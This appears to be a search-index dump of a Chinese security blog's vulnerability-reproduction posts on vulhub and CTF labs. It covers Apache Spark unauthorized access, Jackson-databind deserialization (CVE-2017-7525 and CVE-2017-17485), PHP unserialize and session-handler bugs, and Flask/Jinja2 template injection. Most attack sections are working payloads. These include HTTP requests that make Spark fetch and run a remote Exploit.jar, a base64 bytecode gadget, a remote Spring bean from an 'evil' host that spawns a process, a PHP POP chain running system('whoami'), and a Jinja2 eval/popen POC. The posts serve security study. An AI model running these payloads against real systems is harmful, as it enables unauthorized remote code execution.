未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"用 REST API 方式提交应用: standalone 模式下，master 将在 6066 端口启动一个 HTTP 服务器，我们向这个端口提交 REST 格式的 API： POST /v1/submissions/create HTTP/1.1 Host: your-ip:6066 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Content-Type: application/json Connection: close Content-Length: 680 { \"action\": \"CreateSubmissionRequest\", \"clientSparkVersion\": \"2.3.1\", \"appArgs\": [ \"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf\" ], \"appResource\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"environmentVariables\": { \"SPARK_ENV_LOADED\": \"1\" }, \"mainClass\": \"Exploit\", \"sparkProperties\": { \"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\", \"spark.driver.supervise\": \"false\", \"spark.app.name\": \"Exploit\", \"spark.eventLog.enabled\": \"true\", \"spark.submit.deployMode\": \"cluster\", \"spark.master\": \"spark://your-ip:6066\" } } 其中，spark.jars 即是编译好的应用，mainClass 是待运行的类，appArgs 是传给应用的参数。 返回的包中有 submissionId，然后访问 http://your-ip:8081/logPage/?driverId={submissionId}\u0026logType=stdout，即可查看执行结果： 注意，提交应用是在 master 中，查看结果是在具体执行这个应用的 slave 里（默认8081端口）。实战中，由于slave可能有多个。 ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:1","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现","vulhub"],"content":"利用 submissions 网关 如果 6066 端口不能访问，或做了权限控制，我们可以利用 master 的主端口 7077，来提交应用。 方法是利用 Apache Spark 自带的脚本 bin/spark-submit： bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id 如果你指定的 master 参数是 rest 服务器，这个脚本会先尝试使用 rest api 来提交应用；如果发现不是 rest 服务器，则会降级到使用 submission gateway 来提交应用。 查看结果的方式与前面一致。 ","date":"2019-03-03","objectID":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:2","tags":["漏洞复现","vulhub","Spark"],"title":"Apache Spark 未授权访问漏洞","uri":"/2019/03/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Jackson-databind 反序列化漏洞（CVE-2017-7525）复现","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/","tags":["Jackson-databind","漏洞复现"],"title":"Jackson-databind 反序列化漏洞（CVE-2017-7525）","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["漏洞复现"],"content":"Jackson-databind 反序列化漏洞（CVE-2017-7525） Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。 所以，本漏洞利用条件如下： 开启 JacksonPolymorphicDeserialization，即调用以下任意方法 objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); Target class 需要有无参 constructor Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口 ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:0:0","tags":["Jackson-databind","漏洞复现"],"title":"Jackson-databind 反序列化漏洞（CVE-2017-7525）","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["漏洞复现"],"content":"CVE-2017-7525 Jackson-databind在设置Target class成员变量参数值时，若没有对应的 getter方法，则会使用SetterlessProperty调用getter方法，获取变量，然后设置变量值。当调用getOutputProperties()方法时，会初始化 transletBytecodes包含字节码的类，导致命令执行，具体可参考java-deserialization-jdk7u21-gadget-note中关于TemplatesImpl的说明。 使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch /tmp/prove1.txt： POST /exploit HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 1298 { \"param\": [ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", { \"transletBytecodes\": [ \"yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==\" ], \"transletName\": \"a.b\", \"outputProperties\": {} } ] } 这个POC只能运行在目标为JDK7u21以下的环境中，其他情况需要更换Gadget。 ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:1:0","tags":["Jackson-databind","漏洞复现"],"title":"Jackson-databind 反序列化漏洞（CVE-2017-7525）","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["漏洞复现"],"content":"CVE-2017-17485 CVE-2017-7525黑名单修复绕过，利用了org.springframework.context.support.FileSystemXmlApplicationContext，利用该漏洞，我们需要创建一个bean文件，放置在任意服务器上，如http://evil/spel.xml，内容如下： \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd \"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\"\u003e \u003cconstructor-arg\u003e \u003carray\u003e \u003cvalue\u003etouch\u003c/value\u003e \u003cvalue\u003e/tmp/prove2.txt\u003c/value\u003e \u003c/array\u003e \u003c/constructor-arg\u003e \u003cproperty name=\"any\" value=\"#{ pb.start() }\"/\u003e \u003c/bean\u003e \u003c/beans\u003e 然后，发送如下数据包，使Jackson加载bean，触发漏洞： POST /exploit HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 138 { \"param\": [ \"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://IP/evil.xml\" ] } 成功执行touch /tmp/prove2.txt： 原理： 利用FileSystemXmlApplicationContext加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用start()方法实现命令执行 ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:2:0","tags":["Jackson-databind","漏洞复现"],"title":"Jackson-databind 反序列化漏洞（CVE-2017-7525）","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["常用","渗透测试","CTF"],"content":"CTF 中的反序列化漏洞相关","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"反序列化系列 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"1 定义与原理 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"1.1 相关概念 内存数据是“稍纵即逝”的；通常，程序执行结束，立即全部销毁。变量所存储的数据，就是内存数据；文件是“持久数据” 序列化：就是将内存的变量数据，“保存”到文件中的持久数据的过程。简化就是：将内存变为文件 反序列化：就是将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程。简化就是：将文件变为内存 漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell 等一系列不可控的后果。 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"1.2 相关函数 serialize(mixed value) : string unserialize(string $str) : mixed 1.2.1 序列化 序列化的含义 1.2.2 反序列化 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"2 魔术方法 - magic method __construct()：当一个类被创建时自动调用 __destruct()：当一个类被销毁时自动调用 __invoke()：当把一个类当作函数使用时自动调用 __tostring()：当把一个类当作字符串使用时自动调用 __wakeup()：当调用 unserialize() 函数时自动调用 __sleep()：当调用 serialize() 函数时自动调用 __call()：当要调用的方法不存在或权限不足时自动调用 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"2.1 注意点 \\x00 + 类名 + \\00 + 变量名 反序列化出来的是 private 变量 \\x00 + * + \\x00 + 变量名 反序列化出来的是 protected 变量 直接变量名反序列化出来的是 public 变量 对象前加 + 可以绕过正则 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"2.2 DEMO \u003c?php @error_reporting(1); class baby { public $file; function __toString() { if(isset($this-\u003efile)) { $filename = \"./{$this-\u003efile}\"; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET['data'])) { $data = $_GET['data']; preg_match('/[oc]:\\d+:/i',$data,$matches); // 这里匹配到 O 后面跟着数字就拦截 if(count($matches)) { die('Hacker!'); } else { $good = unserialize($data); echo $good; } } else { highlight_file(\"./index.php\"); } ?\u003e Payload：url?data=O:%2b4:\"baby\":1:{s:4:\"file\";s:8:\"flag.php\";} ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"3 PHP Bug 72663 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"3.1 原理 当序列化字符串中，如果表示对象属性个数的值大于真实属性个数时，就会跳过__wakeup的执行 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"3.2 DEMO \u003c?php class SoFun { protected $file = 'index.php'; function __destruct() { if (!empty($this-\u003efile)) { if (strchr($this-\u003efile, \"\\\\\") === false \u0026\u0026 strchr($this-\u003efile, '/') === false) show_source(dirname(__FILE__) . '/' . $this-\u003efile); else die('Wrong filename.'); } } function __wakeup() { $this-\u003efile = 'index.php'; } public function __toString() { return ''; } } if (!isset($_GET['file'])) { show_source('index.php'); } else { $file = base64_decode($_GET['file']); echo unserialize($file); } ?\u003e#\u003c!--key in flag.php--\u003e payload：url?file=Tzo1OiJTb0Z1biI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:2","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"4 PHP Session 序列化及反序列化 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"4.1 相关原理 4.1.1 PHP Session 序列化机制 当 session_start() 被调用或者 php.ini 中 session.auto_start 为 1 时，PHP 内部调用会话管理器，访问用户 session 被序列化以后，存储到指定目录（默认为 /tmp）。 4.1.2 session 序列化及反序列化处理器 PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式 处理器 对应的存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php\u003e=5.5.4) 经过 serialize() 函数反序列处理的数组 4.1.3 与 session 存储相关的配置项 配置文件 php.ini 中含有这几个与 session 存储相关的配置项： session.save_path = \"E:/wamp64/tmp\" -- 设置 session 的存储路径，默认在 /tmp session.auto_start = 0 -- 指定会话模块是否在请求开始时启动一个会话，默认为 0 不启动 session.serialize_handler = php -- 定义用来序列化/反序列化的处理器名字。默认使用 php PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器，默认为php。如果要修改为其他的引擎，只需要添加代码 ini_set('session.serialize_handler', '需要设置的引擎')，如下所示： \u003c?php ini_set('session.serialize_handler', 'php'); session_start(); $SESSION['a'] = $_GET['a']; 存储的文件是以 sess_sessionid 来进行命名的，文件的内容就是 session 值的序列化之后的内容。可在 session.save_path 对应路径下看到一个新生成的 session 文件，这里名为 sess_cj15cikdujk6uv3bdq6qvonbe7 ，可以看到存储格式为：键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值：a|s3:\"123\"; 使用 php_serialize 处理器： \u003c?php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $SESSION['a'] = $_GET['a']; 格式：经过 serialize() 函数反序列处理的数组：a:1:{s:1:\"a\";s:3:\"123\";} ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"4.2 PHP session 反序列化漏洞 如果 PHP 在反序列化存储的 $_SESSION 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。 示例 当存储是 php_serialize 处理，然后调用时使用 php 处理器去处理，如果这时注入的数据是：a=|O:4:\"test\":0{}，那么 session 中的内容是 a:1:{s:1:\"a\";s:16:\"|O:4:\"test\":0:{}\";}，根据解释，其中 a:1:{s:1:\"a\";s:16:\" 在经过 php 解析后被看作成键名，后面就是一个实例化的 test 对象的注入 当配置选项 session_auto_start=Off ，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题。 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:2","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试","CTF"],"content":"4.3 DEMO index.php \u003c?php show_source(__FILE__); ini_set('session.serialize_handler', 'php'); require('./class.php'); session_start(); $obj = new fool(); $obj-\u003evarr = \"phpinfo.php\"; class.php \u003c?php highlight_string(file_get_contents(basename($_SERVER['PHP_SELF']))); show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this-\u003evarr = \"i.php\"; } function __destruct(){ if(file_exists($this-\u003evarr)){ echo \"\u003cbr\u003e文件\".$this-\u003evarr.\"存在\u003cbr\u003e\"; } echo \"\u003cbr\u003e这是foo1的析构函数\u003cbr\u003e\"; } } class foo2{ public $varr; public $obj; function __construct(){ $this-\u003evarr = '1234567890'; $this-\u003eobj = null; } function __toString(){ $this-\u003eobj-\u003eexecute(); return $this-\u003evarr; } function __desctuct(){ echo \"\u003cbr\u003e这是foo2的析构函数\u003cbr\u003e\"; } } class foo3{ public $varr; function execute(){ eval($this-\u003evarr); } function __desctuct(){ echo \"\u003cbr\u003e这是foo3的析构函数\u003cbr\u003e\"; } } ?\u003e phpinfo.php \u003c?php show_source(__FILE__); session_start(); require(\"./class.php\"); $f3 = new foo3(); $f3-\u003evarr = \"phpinfo();\"; $f3-\u003eexecute(); ? 可以看到，index.php 中用的是 php 处理器。 在 php.ini 中的关键配置，注意配置中的session.serialize_handler： session.serialize_handler=php_serialize session.upload_progress.cleanup=Off session.upload_progress.enabled=On 可以访问 phpinfo.php 查看配置信息： 默认是采用 php 处理器处理 session，session.upload_progress.cleanup 配置为 Off，session.upload_progress.enabled 配置为 On。 session.upload_progress.enabled，当它为开启状态时，PHP 能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时 POST 一个与 php.ini中设置的 session.upload_progress.name 同名变量时，上传进度就可以在 $_SESSION 中获得。当 PHP 检测到这种 POST 请求时，它会在 $_SESSION 中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name 连接在一起的值。 当前代码的话没有向服务器提交数据，但是现在 session.upload_progress.enabled 是开启的，所以可以通过上传文件，从而在 session 文件中写入数据。 也就是说，利用点是通过 session.upload_progress.enabled 来上传文件向 session 文件中写入 php_serialize 处理器格式的内容，从而与 index.php 中 php 处理器不同进而造成 session 反序列化漏洞的存在。 poc.php，用于生成序列化 poc，在 foo1 中的构造函数中定义 $varr 的值为 foo2 的实例，在 foo2 中定义 $obj 为 foo3 的实例，在 foo3 中定义 $varr 的值为 system(‘whoami’);： poc.php \u003c?php class foo3{ public $varr; function __construct(){ $this-\u003evarr = \"system('whoami');\"; } } class foo2{ public $varr; public $obj; function __construct(){ $this-\u003evarr = '1'; $this-\u003eobj = new foo3(); } } class foo1{ public $varr; function __construct(){ $this-\u003evarr = new foo2(); } } echo serialize(new foo1()); ?\u003e form.html，一个向 index.php 提交 POST 请求的表单文件，其中包括 PHP_SESSION_UPLOAD_PROGRESS 变量： \u003cform action=\"http://127.0.0.1/i.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"geekby\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e Burpsuite 截断该 form.html 发送的 POST 请求，在 PHP_SESSION_UPLOAD_PROGRESS 一栏中的值加上 poc.php 生成的 poc 就能够成功执行命令了： |O:4:\"foo1\":1:{s:4:\"varr\";O:4:\"foo2\":2:{s:4:\"varr\";s:1:\"1\";s:3:\"obj\";O:4:\"foo3\":1:{s:4:\"varr\";s:19:\"system(\"whoami\");\";}}} ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:3","tags":["常用","渗透测试","反序列化漏洞"],"title":"PHP 反序列化漏洞相关","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["漏洞复现"],"content":"Flask（Jinja2）服务端模板注入漏洞复现","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","tags":["Flask","漏洞复现","vulhub"],"title":"Flask（Jinja2）服务端模板注入漏洞","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"Flask（Jinja2） 服务端模板注入漏洞 ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["Flask","漏洞复现","vulhub"],"title":"Flask（Jinja2）服务端模板注入漏洞","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"原理 ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["Flask","漏洞复现","vulhub"],"title":"Flask（Jinja2）服务端模板注入漏洞","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"参考文章 https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates ","date":"2019-02-16","objectID":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:1","tags":["Flask","漏洞复现","vulhub"],"title":"Flask（Jinja2）服务端模板注入漏洞","uri":"/2019/02/flaskjinja2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞复现 访问http://your-ip/?name={{233*233}}，得到54289，说明SSTI漏洞存在。 获取 eval 函数并执行任意 python 代码的 POC： {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 